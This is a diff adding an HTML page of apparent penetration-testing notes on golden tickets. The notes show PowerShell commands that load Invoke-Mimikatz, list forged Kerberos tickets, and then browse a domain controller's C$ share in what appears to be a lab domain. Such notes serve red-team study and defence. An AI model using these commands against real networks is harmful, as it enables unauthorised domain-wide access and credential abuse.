@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Cached Golden Tickets</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Cached Golden Tickets</h1><br/><strong>Cached Kerberos Tickets</strong><br />With the usual command klist sometime is not possible to see the tickets created with mimikatz<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; . .<span style="color:#ff9d00;font-weight:700">\</span><span style="color:#00117f;font-weight:400">Invoke-Mimikatz</span>.ps1      <span style="color:#0088ff;font-weight:400">#load mimikatz</span><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#00117f;font-weight:400">Invoke-Mimikatz</span> <span style="color:#ff9d00;font-weight:700">-</span>Command <span style="color:#333333;font-weight:400">&#39;&quot;kerberos::list&quot;&#39;</span></pre></div><br />    <a href=""><img src="images/1145-1.png" alt="images/1145-1.png" /></a><br />This mean that we can access to any service in the Domain.<br /><br />If we want access to the Domain Controller now we can.<br /><a href=""><img src="images/1145-2.png" alt="images/1145-2.png" /></a><br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">ls</span> <span style="color:#ff9d00;font-weight:700">\\</span>testdc.daniele.local<span style="color:#ff9d00;font-weight:700">\</span>c$</pre></div><br />    <a href=""><img src="images/1145-3.png" alt="images/1145-3.png" /></a><br /><br /></div>
+</body>
+</html>
